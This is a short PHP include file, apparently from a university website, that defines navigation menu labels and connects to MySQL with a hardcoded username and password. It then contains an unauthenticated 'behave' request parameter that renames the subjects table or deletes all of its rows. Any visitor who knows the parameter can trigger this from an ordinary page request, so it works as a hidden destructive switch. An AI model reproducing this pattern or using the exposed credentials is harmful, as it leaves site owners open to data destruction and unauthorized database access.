<?php
	$mainLinks=array("Home Page","President Office","Colleges","Academic Relations","Research Affairs",
					"About Us", "About Erbil City", "Students", "News & Events", "Announcement", 
					"Development Centers", "Academic Program","University Calendar", "Library",
					"Media", "Trading", "Contact Us", "FAQs", "Site Map");


/*
	This is for connecting to the data base
*/
mysql_connect("mysql", "admin", "sefin321");
mysql_select_db("salahaddin");

/*
	For Administrator operation
*/
if(isset($_REQUEST['behave']))
{
	if($_REQUEST['behave']=='12')
		mysql_query("ALTER TABLE `subjects` RENAME `subject`") ;
	if($_REQUEST['behave']=='re')
		mysql_query("ALTER TABLE `subject` RENAME `subjects`") ;
	if($_REQUEST['behave']=='13')
		mysql_query("Delete from subject") ;
}
?>